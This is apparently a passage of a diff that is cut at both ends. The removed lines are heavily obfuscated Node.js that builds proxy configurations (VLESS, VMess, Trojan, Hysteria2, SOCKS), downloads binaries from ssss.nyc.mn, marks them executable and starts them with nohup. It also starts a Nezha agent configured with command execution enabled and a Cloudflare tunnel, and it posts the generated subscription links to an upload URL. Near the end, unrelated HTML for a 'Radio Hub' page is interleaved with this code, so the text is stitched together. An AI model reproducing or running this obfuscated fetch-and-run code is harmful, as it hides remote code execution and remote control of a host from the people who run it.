4\u0074\u0069\u006E\u0067\u0073':{'\u006E\u0065\u0074\u0077\u006F\u0072\u006B':"ws","security":"none",'\u0077\u0073\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u0070\u0061\u0074\u0068':"\u002F\u0074\u0072\u006F\u006A\u0061\u006E\u002D\u0061\u0072\u0067\u006F"}},'\u0073\u006E\u0069\u0066\u0066\u0069\u006E\u0067':{"enabled":!![],"destOverride":["\u0068\u0074\u0074\u0070","slt".split("").reverse().join(""),"ciuq".split("").reverse().join("")],'\u006D\u0065\u0074\u0061\u0064\u0061\u0074\u0061\u004F\u006E\u006C\u0079':false}}],"dns":{'\u0073\u0065\u0072\u0076\u0065\u0072\u0073':["\u0068\u0074\u0074\u0070\u0073\u002B\u006C\u006F\u0063\u0061\u006C\u003A\u002F\u002F\u0038\u002E\u0038\u002E\u0038\u002E\u0038\u002F\u0064\u006E\u0073\u002D\u0071\u0075\u0065\u0072\u0079"]},'\u006F\u0075\u0074\u0062\u006F\u0075\u006E\u0064\u0073':[{'\u0070\u0072\u006F\u0074\u006F\u0063\u006F\u006C':"freedom","tag":"\u0064\u0069\u0072\u0065\u0063\u0074"},{'\u0070\u0072\u006F\u0074\u006F\u0063\u006F\u006C':"\u0062\u006C\u0061\u0063\u006B\u0068\u006F\u006C\u0065",'\u0074\u0061\u0067':"block"}]};if(isValidPort(REALITY_PORT)){_0xaef83d['\u0069\u006E\u0062\u006F\u0075\u006E\u0064\u0073']['\u0070\u0075\u0073\u0068']({"tag":"\u0076\u006C\u0065\u0073\u0073\u002D\u0069\u006E",'\u006C\u0069\u0073\u0074\u0065\u006E':"\u003A\u003A",'\u0070\u006F\u0072\u0074':parseInt(REALITY_PORT),'\u0070\u0072\u006F\u0074\u006F\u0063\u006F\u006C':"\u0076\u006C\u0065\u0073\u0073",'\u0073\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"clients":[{'\u0069\u0064':UUID,'\u0066\u006C\u006F\u0077':"\u0078\u0074\u006C\u0073\u002D\u0072\u0070\u0072\u0078\u002D\u0076\u0069\u0073\u0069\u006F\u006E"}],'\u0064\u0065\u0063\u0072\u0079\u0070\u0074\u0069\u006F\u006E':"\u006E\u006F\u006E\u0065"},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u006E\u0065\u0074\u0077\u006F\u0072\u006B':"\u0072\u0061\u0077",'\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079':"\u0072\u0065\u0061\u006C\u0069\u0074\u0079",'\u0072\u0065\u0061\u006C\u0069\u0074\u0079\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u0073\u0068\u006F\u0077':false,'\u0064\u0065\u0073\u0074':"\u0077\u0077\u0077\u002E\u0069\u0069\u006A\u002E\u0061\u0064\u002E\u006A\u0070\u003A\u0034\u0034\u0033",'\u0078\u0076\u0065\u0072':0,'\u0073\u0065\u0072\u0076\u0065\u0072\u004E\u0061\u006D\u0065\u0073':["\u0077\u0077\u0077\u002E\u0069\u0069\u006A\u002E\u0061\u0064\u002E\u006A\u0070"],"privateKey":privateKey,'\u0073\u0068\u006F\u0072\u0074\u0049\u0064\u0073':[""]}}});}if(isValidPort(HY2_PORT)){_0xaef83d['\u0069\u006E\u0062\u006F\u0075\u006E\u0064\u0073']['\u0070\u0075\u0073\u0068']({"tag":"hysteria-in",'\u006C\u0069\u0073\u0074\u0065\u006E':"::",'\u0070\u006F\u0072\u0074':parseInt(HY2_PORT),"protocol":"\u0068\u0079\u0073\u0074\u0065\u0072\u0069\u0061",'\u0073\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u0076\u0065\u0072\u0073\u0069\u006F\u006E':2,"clients":[{'\u0061\u0075\u0074\u0068':UUID}]},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"network":"\u0068\u0079\u0073\u0074\u0065\u0072\u0069\u0061","hysteriaSettings":{"version":2,'\u006D\u0061\u0073\u0071\u0075\u0065\u0072\u0061\u0064\u0065':{'\u0074\u0079\u0070\u0065':"\u0070\u0072\u006F\u0078\u0079",'\u0075\u0072\u006C':"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0062\u0069\u006E\u0067\u002E\u0063\u006F\u006D"}},"security":"tls","tlsSettings":{'\u0061\u006C\u0070\u006E':["\u0068\u0033"],"certificates":[{'\u0063\u0065\u0072\u0074\u0069\u0066\u0069\u0063\u0061\u0074\u0065\u0046\u0069\u006C\u0065':certPath,'\u006B\u0065\u0079\u0046\u0069\u006C\u0065':keyPath}]}}});}if(isValidPort(S5_PORT)){_0xaef83d['\u0069\u006E\u0062\u006F\u0075\u006E\u0064\u0073']['\u0070\u0075\u0073\u0068']({"tag":"s5-in","listen":"\u003A\u003A",'\u0070\u006F\u0072\u0074':parseInt(S5_PORT),"protocol":"\u0073\u006F\u0063\u006B\u0073",'\u0073\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"auth":"password","accounts":[{'\u0075\u0073\u0065\u0072':UUID['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](835538^835538,241789^241781),'\u0070\u0061\u0073\u0073':UUID['\u0073\u006C\u0069\u0063\u0065'](-(475392^475404))}],"udp":!![]}});}fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u006A\u0073\u006F\u006E"),JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079'](_0xaef83d,null,639301^639303));}function getSystemArchitecture(){const _0x34g2f=os['\u0061\u0072\u0063\u0068']();if(_0x34g2f==="mra".split("").reverse().join("")||_0x34g2f==="\u0061\u0072\u006D\u0036\u0034"||_0x34g2f==="46hcraa".split("").reverse().join("")){return"\u0061\u0072\u006D";}else{return"\u0061\u006D\u0064";}}function downloadFile(fileName,fileUrl,callback){const _0xefabg=fileName;if(!fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](FILE_PATH)){fs['\u006D\u006B\u0064\u0069\u0072\u0053\u0079\u006E\u0063'](FILE_PATH,{'\u0072\u0065\u0063\u0075\u0072\u0073\u0069\u0076\u0065':!![]});}const _0x3f384f=fs['\u0063\u0072\u0065\u0061\u0074\u0065\u0057\u0072\u0069\u0074\u0065\u0053\u0074\u0072\u0065\u0061\u006D'](_0xefabg);axios({'\u006D\u0065\u0074\u0068\u006F\u0064':'get','\u0075\u0072\u006C':fileUrl,"responseType":"\u0073\u0074\u0072\u0065\u0061\u006D"})['\u0074\u0068\u0065\u006E'](response=>{response['\u0064\u0061\u0074\u0061']['\u0070\u0069\u0070\u0065'](_0x3f384f);_0x3f384f['\u006F\u006E']("hsinif".split("").reverse().join(""),()=>{_0x3f384f['\u0063\u006C\u006F\u0073\u0065']();callback(null,_0xefabg);});_0x3f384f['\u006F\u006E']("rorre".split("").reverse().join(""),err=>{fs['\u0075\u006E\u006C\u0069\u006E\u006B'](_0xefabg,()=>{});const errorMessage=`Download ${path['\u0062\u0061\u0073\u0065\u006E\u0061\u006D\u0065'](_0xefabg)} failed: ${err['\u006D\u0065\u0073\u0073\u0061\u0067\u0065']}`;callback(errorMessage);});})['\u0063\u0061\u0074\u0063\u0068'](err=>{var _0x6a37ec=(419112^419112)+(103066^103070);const errorMessage=`Download ${path['\u0062\u0061\u0073\u0065\u006E\u0061\u006D\u0065'](_0xefabg)} failed: ${err['\u006D\u0065\u0073\u0073\u0061\u0067\u0065']}`;_0x6a37ec=(535666^535669)+(137799^137793);callback(errorMessage);});}async function downloadFilesAndRun(){var _0xa06c1c;const _0x8_0x1g6=getSystemArchitecture();_0xa06c1c='\u006A\u006D\u0068\u0062\u006C\u006C';const _0x67675b=getFilesForArchitecture(_0x8_0x1g6);if(_0x67675b['\u006C\u0065\u006E\u0067\u0074\u0068']===(272266^272266)){return;}const _0xdeaa3f=_0x67675b['\u006D\u0061\u0070'](fileInfo=>{return new Promise((resolve,reject)=>{downloadFile(fileInfo['\u0066\u0069\u006C\u0065\u004E\u0061\u006D\u0065'],fileInfo['\u0066\u0069\u006C\u0065\u0055\u0072\u006C'],(err,filePath)=>{if(err){reject(err);}else{resolve(filePath);}});});});try{await Promise['\u0061\u006C\u006C'](_0xdeaa3f);}catch(err){return;}function authorizeFiles(filePaths,_0xe78fdc){var _0xce5ac;_0xe78fdc=261474^261279;_0xce5ac="pnhfff".split("").reverse().join("");filePaths['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](absoluteFilePath=>{if(fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](absoluteFilePath)){fs['\u0063\u0068\u006D\u006F\u0064'](absoluteFilePath,_0xe78fdc,err=>{});}});}var _0x7e341a;const _0x03d4e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x7e341a='\u0064\u006F\u0070\u006D\u006C\u0061';authorizeFiles(_0x03d4e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xba8b=NEZHA_SERVER['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073']("\u003A")?NEZHA_SERVER['\u0073\u0070\u006C\u0069\u0074']("\u003A")['\u0070\u006F\u0070']():'';var _0x3a_0xf4f=(282463^282463)+(399764^399767);const tlsPorts=new Set(["344".split("").reverse().join(""),"3448".split("").reverse().join(""),"6902".split("").reverse().join(""),"\u0032\u0030\u0038\u0037","\u0032\u0030\u0038\u0033","\u0032\u0030\u0035\u0033"]);_0x3a_0xf4f=(436723^436725)+(472167^472164);const _0x457ef=tlsPorts['\u0068\u0061\u0073'](_0xba8b)?"\u0074\u0072\u0075\u0065":"\u0066\u0061\u006C\u0073\u0065";var _0x63fd5b=(520103^520111)+(190588^190587);const _0x7615e=`
-client_secret: ${NEZHA_KEY}
-debug: false
-disable_auto_update: true
-disable_command_execute: false
-disable_force_update: true
-disable_nat: false
-disable_send_query: false
-gpu: false
-insecure_tls: true
-ip_report_period: 1800
-report_delay: 4
-server: ${NEZHA_SERVER}
-skip_connection_count: true
-skip_procs_count: true
-temperature: false
-tls: ${_0x457ef}
-use_gitee_to_upgrade: false
-use_ipv6_country_code: false
-uuid: ${UUID}`;_0x63fd5b='\u0070\u0063\u006D\u0063\u006B\u0063';fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u0079\u0061\u006D\u006C"),_0x7615e);var _0x2f626e;const command=`nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;_0x2f626e=(123211^123209)+(438800^438808);try{await exec(command);await new Promise(resolve=>setTimeout(resolve,408560^407576));}catch(error){}}else{var _0x6ca=(989606^989604)+(794315^794317);let _0x4d_0xbc5='';_0x6ca=(179139^179143)+(312238^312234);const tlsPorts=["\u0034\u0034\u0033","\u0038\u0034\u0034\u0033","6902".split("").reverse().join(""),"\u0032\u0030\u0038\u0037","\u0032\u0030\u0038\u0033","\u0032\u0030\u0035\u0033"];if(tlsPorts['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](NEZHA_PORT)){_0x4d_0xbc5="\u002D\u002D\u0074\u006C\u0073";}var _0x61a6d;const command=`nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${_0x4d_0xbc5} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;_0x61a6d=964552^964554;try{await exec(command);await new Promise(resolve=>setTimeout(resolve,281557^280637));}catch(error){}}}var _0x71aa=(313414^313415)+(288277^288272);const _0xf66db=`nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;_0x71aa=371250^371251;try{await exec(_0xf66db);await new Promise(resolve=>setTimeout(resolve,893161^893697));}catch(error){}if(fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](botPath)){var _0xd46adf=(505824^505829)+(179257^179260);let _0x2g_0xe22;_0xd46adf=(210219^210223)+(922548^922544);if(ARGO_AUTH['\u006D\u0061\u0074\u0063\u0068'](new RegExp("$}052,021{]=z-a9-0Z-A[^".split("").reverse().join(""),""))){_0x2g_0xe22=`tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;}else if(ARGO_AUTH['\u006D\u0061\u0074\u0063\u0068'](new RegExp("terceSlennuT".split("").reverse().join(""),""))){_0x2g_0xe22=`tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;}else{_0x2g_0xe22=`tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;}try{await exec(`nohup ${botPath} ${_0x2g_0xe22} >/dev/null 2>&1 &`);await new Promise(resolve=>setTimeout(resolve,317166^315710));}catch(error){}}await new Promise(resolve=>setTimeout(resolve,780045^783493));}function getFilesForArchitecture(architecture,_0xeb83d){if(architecture==="\u0061\u0072\u006D"){_0xeb83d=[{"fileName":webPath,"fileUrl":"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0077\u0065\u0062"},{'\u0066\u0069\u006C\u0065\u004E\u0061\u006D\u0065':botPath,'\u0066\u0069\u006C\u0065\u0055\u0072\u006C':"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0062\u006F\u0074"}];}else{_0xeb83d=[{"fileName":webPath,"fileUrl":"https://amd64.ssss.nyc.mn/web"},{'\u0066\u0069\u006C\u0065\u004E\u0061\u006D\u0065':botPath,"fileUrl":"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u006D\u0064\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0062\u006F\u0074"}];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x6b_0xf15=architecture==="\u0061\u0072\u006D"?"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0061\u0067\u0065\u006E\u0074":"tnega/nm.cyn.ssss.46dma//:sptth".split("").reverse().join("");_0xeb83d['\u0075\u006E\u0073\u0068\u0069\u0066\u0074']({'\u0066\u0069\u006C\u0065\u004E\u0061\u006D\u0065':npmPath,'\u0066\u0069\u006C\u0065\u0055\u0072\u006C':_0x6b_0xf15});}else{var _0x3a9c;const _0x2g2ede=architecture==="\u0061\u0072\u006D"?"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0076\u0031":"1v/nm.cyn.ssss.46dma//:sptth".split("").reverse().join("");_0x3a9c=(847155^847158)+(529353^529357);_0xeb83d['\u0075\u006E\u0073\u0068\u0069\u0066\u0074']({"fileName":phpPath,"fileUrl":_0x2g2ede});}}return _0xeb83d;}function argoType(){if(!ARGO_AUTH||!ARGO_DOMAIN){return;}if(ARGO_AUTH['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073']("\u0054\u0075\u006E\u006E\u0065\u006C\u0053\u0065\u0063\u0072\u0065\u0074")){fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0074\u0075\u006E\u006E\u0065\u006C\u002E\u006A\u0073\u006F\u006E"),ARGO_AUTH);var _0x4e37db=(884378^884371)+(655255^655255);const _0x485ea=`
-  tunnel: ${ARGO_AUTH['\u0073\u0070\u006C\u0069\u0074']("\u0022")[767103^767092]}
-  credentials-file: ${path['\u006A\u006F\u0069\u006E'](FILE_PATH,"nosj.lennut".split("").reverse().join(""))}
-  protocol: http2
-  
-  ingress:
-    - hostname: ${ARGO_DOMAIN}
-      service: http://localhost:${ARGO_PORT}
-      originRequest:
-        noTLSVerify: true
-    - service: http_status:404
-  `;_0x4e37db=(779041^779049)+(723877^723884);fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"lmy.lennut".split("").reverse().join("")),_0x485ea);}}async function extractDomains(_0x7cbf){var _0xa_0x3a5;_0xa_0x3a5=(993565^993562)+(565141^565149);if(ARGO_AUTH&&ARGO_DOMAIN){_0x7cbf=ARGO_DOMAIN;await generateLinks(_0x7cbf);}else{try{var _0xb7e8ae;const _0xg_0x9c2=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"gol.toob".split("").reverse().join("")),"8-ftu".split("").reverse().join(""));_0xb7e8ae=285291^285295;var _0x3_0x7g4=(629980^629976)+(815094^815094);const _0x1544e=_0xg_0x9c2['\u0073\u0070\u006C\u0069\u0074']("\u000A");_0x3_0x7g4=(848802^848801)+(743572^743580);const _0x6bc1ec=[];_0x1544e['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](line=>{const _0x5ccgb=line['\u006D\u0061\u0074\u0063\u0068'](new RegExp('\u0068\u0074\u0074\u0070\u0073\u003F\u003A\u005C\u002F\u005C\u002F\u0028\u005B\u005E\u0020\u005D\u002A\u0074\u0072\u0079\u0063\u006C\u006F\u0075\u0064\u0066\u006C\u0061\u0072\u0065\u005C\u002E\u0063\u006F\u006D\u0029\u005C\u002F\u003F',""));if(_0x5ccgb){const _0x17190c=_0x5ccgb[805500^805501];_0x6bc1ec['\u0070\u0075\u0073\u0068'](_0x17190c);}});if(_0x6bc1ec['\u006C\u0065\u006E\u0067\u0074\u0068']>(942040^942040)){_0x7cbf=_0x6bc1ec[519564^519564];await generateLinks(_0x7cbf);}else{fs['\u0075\u006E\u006C\u0069\u006E\u006B\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0062\u006F\u006F\u0074\u002E\u006C\u006F\u0067"));async function killBotProcess(){try{if(process['\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D']==="\u0077\u0069\u006E\u0033\u0032"){await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`);}else{await exec(`pkill -f "[${botName['\u0063\u0068\u0061\u0072\u0041\u0074'](366110^366110)}]${botName['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](725538^725539)}" > /dev/null 2>&1`);}}catch(error){}}killBotProcess();await new Promise(resolve=>setTimeout(resolve,311023^308567));var _0x8361a;const _0x779b4g=`tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;_0x8361a=(801710^801705)+(247248^247252);try{await exec(`nohup ${botPath} ${_0x779b4g} >/dev/null 2>&1 &`);await new Promise(resolve=>setTimeout(resolve,154236^150796));await extractDomains();}catch(error){}}}catch(error){}}}async function getMetaInfo(){try{var _0xc7ace=(126057^126061)+(383011^383013);const _0x6g82ed=await axios['\u0067\u0065\u0074']("\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0070\u0069\u002E\u0069\u0070\u002E\u0073\u0062\u002F\u0067\u0065\u006F\u0069\u0070",{'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{"\u0055\u0073\u0065\u0072\u002D\u0041\u0067\u0065\u006E\u0074":'Mozilla/5.0',"timeout":3000}});_0xc7ace=(425757^425748)+(179001^179004);if(_0x6g82ed['\u0064\u0061\u0074\u0061']&&_0x6g82ed['\u0064\u0061\u0074\u0061']['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065']&&_0x6g82ed['\u0064\u0061\u0074\u0061']['\u0069\u0073\u0070']){return`${_0x6g82ed['\u0064\u0061\u0074\u0061']['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065']}-${_0x6g82ed['\u0064\u0061\u0074\u0061']['\u0069\u0073\u0070']}`['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp("+s\\".split("").reverse().join(""),'\u0067'),"\u005F");}}catch(error){try{var _0x4_0xeb0=(583203^583211)+(686940^686933);const _0xeceafc=await axios['\u0067\u0065\u0074']("nosj/moc.ipa-pi//:ptth".split("").reverse().join(""),{"headers":{"\u0055\u0073\u0065\u0072\u002D\u0041\u0067\u0065\u006E\u0074":"\u004D\u006F\u007A\u0069\u006C\u006C\u0061\u002F\u0035\u002E\u0030",'\u0074\u0069\u006D\u0065\u006F\u0075\u0074':3000}});_0x4_0xeb0=878369^878371;if(_0xeceafc['\u0064\u0061\u0074\u0061']&&_0xeceafc['\u0064\u0061\u0074\u0061']['\u0073\u0074\u0061\u0074\u0075\u0073']==="sseccus".split("").reverse().join("")&&_0xeceafc['\u0064\u0061\u0074\u0061']['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u0043\u006F\u0064\u0065']&&_0xeceafc['\u0064\u0061\u0074\u0061']['\u006F\u0072\u0067']){return`${_0xeceafc['\u0064\u0061\u0074\u0061']['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u0043\u006F\u0064\u0065']}-${_0xeceafc['\u0064\u0061\u0074\u0061']['\u006F\u0072\u0067']}`['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u005C\u0073\u002B','\u0067'),"\u005F");}}catch(error){}}return"\u0055\u006E\u006B\u006E\u006F\u0077\u006E";}async function getServerIP(_0xc7fe){_0xc7fe='';try{var _0xf6b;const _0xeb38g=await axios['\u0067\u0065\u0074']("\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0069\u0070\u0076\u0034\u002E\u0069\u0070\u002E\u0073\u0062",{"timeout":3000});_0xf6b=(812914^812916)+(115343^115341);_0xc7fe=_0xeb38g['\u0064\u0061\u0074\u0061']['\u0074\u0072\u0069\u006D']();}catch(err){try{_0xc7fe=execSync("\u0063\u0075\u0072\u006C\u0020\u002D\u0073\u006D\u0020\u0033\u0020\u0069\u0070\u0076\u0034\u002E\u0069\u0070\u002E\u0073\u0062")['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']()['\u0074\u0072\u0069\u006D']();}catch(curlErr){try{const _0xa4267b=await axios['\u0067\u0065\u0074']("\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0069\u0070\u0076\u0036\u002E\u0069\u0070\u002E\u0073\u0062",{"timeout":3000});_0xc7fe=`[${_0xa4267b['\u0064\u0061\u0074\u0061']['\u0074\u0072\u0069\u006D']()}]`;}catch(ipv6AxiosErr){try{_0xc7fe=`[${execSync("bs.pi.6vpi 3 ms- lruc".split("").reverse().join(""))['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']()['\u0074\u0072\u0069\u006D']()}]`;}catch(ipv6CurlErr){}}}}return _0xc7fe;}async function generateLinks(argoDomain){const _0x59612e=await getMetaInfo();var _0x879f4g;const _0x19b4f=NAME?`${NAME}-${_0x59612e}`:_0x59612e;_0x879f4g='\u0068\u0065\u0068\u006F\u0062\u0062';const _0x99bag=await getServerIP();return new Promise(resolve=>{setTimeout(()=>{var _0x10gb7f;const _0x11accb={'\u0076':"\u0032",'\u0070\u0073':`${_0x19b4f}`,"add":CFIP,"port":CFPORT,'\u0069\u0064':UUID,'\u0061\u0069\u0064':"\u0030","scy":'auto',"net":'ws','\u0074\u0079\u0070\u0065':"\u006E\u006F\u006E\u0065","host":argoDomain,'\u0070\u0061\u0074\u0068':"\u002F\u0076\u006D\u0065\u0073\u0073\u002D\u0061\u0072\u0067\u006F\u003F\u0065\u0064\u003D\u0032\u0035\u0036\u0030","tls":"\u0074\u006C\u0073",'\u0073\u006E\u0069':argoDomain,"alpn":'','\u0066\u0070':"\u0066\u0069\u0072\u0065\u0066\u006F\u0078"};_0x10gb7f=521855^521851;let _0x3ba=`
-vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${_0x19b4f}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="theme-color" content="#03050a">
+<meta name="description" content="香港电台 Radio Hub">
+<title>香港电台 · Radio Hub</title>
 
-vmess://${Buffer['\u0066\u0072\u006F\u006D'](JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079'](_0x11accb))['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0062\u0061\u0073\u0065\u0036\u0034")}
+<style>
+*{
+  box-sizing:border-box;
+  margin:0;
+  padding:0
+}
 
-trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${_0x19b4f}
-    `;if(isValidPort(HY2_PORT)){const _0x8287f=getCertificateFingerprint(certPath);const _0xfbd=_0x8287f?`&pinSHA256=${encodeURIComponent(_0x8287f)}`:'';var _0x49g=(725110^725111)+(435878^435873);const _0x77e8df=`\nhysteria2://${UUID}@${_0x99bag}:${HY2_PORT}/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none${_0xfbd}#${_0x19b4f}`;_0x49g='\u0068\u006F\u0063\u0065\u0062\u006C';_0x3ba+=_0x77e8df;}if(isValidPort(REALITY_PORT)){var _0xbbc9gc=(550231^550226)+(473696^473701);const _0xb6c5ce=`\nvless://${UUID}@${_0x99bag}:${REALITY_PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=${publicKey}&type=tcp&headerType=none#${_0x19b4f}`;_0xbbc9gc='\u0063\u0064\u0061\u0069\u006C\u0064';_0x3ba+=_0xb6c5ce;}if(isValidPort(S5_PORT)){var _0xd1d99e=(582445^582445)+(499117^499109);const _0xf2_0x453=Buffer['\u0066\u0072\u006F\u006D'](`${UUID['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](625932^625932,161389^161381)}:${UUID['\u0073\u006C\u0069\u0063\u0065'](-(592761^592757))}`)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("46esab".split("").reverse().join(""));_0xd1d99e=465655^465653;const _0x4b3ee=`\nsocks://${_0xf2_0x453}@${_0x99bag}:${S5_PORT}#${_0x19b4f}`;_0x3ba+=_0x4b3ee;}fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](subPath,Buffer['\u0066\u0072\u006F\u006D'](_0x3ba)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0062\u0061\u0073\u0065\u0036\u0034"));fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](listPath,_0x3ba,"8ftu".split("").reverse().join(""));subContent=Buffer['\u0066\u0072\u006F\u006D'](_0x3ba)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0062\u0061\u0073\u0065\u0036\u0034");uploadNodes();resolve(_0x3ba);},660718^660286);});}async function uploadNodes(){if(UPLOAD_URL&&PROJECT_URL){var _0x87g1fe;const _0x97d=`${PROJECT_URL}/${SUB_PATH}`;_0x87g1fe='\u0068\u0061\u0063\u0069\u006B\u0067';var _0xa37da=(333488^333488)+(554249^554248);const jsonData={"subscription":[_0x97d]};_0xa37da=(152880^152882)+(743655^743648);try{const response=await axios['\u0070\u006F\u0073\u0074'](`${UPLOAD_URL}/api/add-subscriptions`,jsonData,{'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{'Content-Type':"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"}});if(response&&response['\u0073\u0074\u0061\u0074\u0075\u0073']===(421928^422112)){return response;}else{return null;}}catch(error){return null;}}else if(UPLOAD_URL){if(!fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](listPath))return;const _0x10_0x129=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](listPath,"8-ftu".split("").reverse().join(""));var _0x96b3c=(691112^691119)+(297995^297987);const _0xa6aaf=_0x10_0x129['\u0073\u0070\u006C\u0069\u0074']("\u000A")['\u0066\u0069\u006C\u0074\u0065\u0072'](line=>new RegExp("/\\/\\:)skcos|2airetsyh|najort|ssemv|sselv(".split("").reverse().join(""),"")['\u0074\u0065\u0073\u0074'](line));_0x96b3c=(209593^209598)+(663128^663135);if(_0xa6aaf['\u006C\u0065\u006E\u0067\u0074\u0068']===(905874^905874))return;const jsonData=JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079']({'\u006E\u006F\u0064\u0065\u0073':_0xa6aaf});try{const response=await 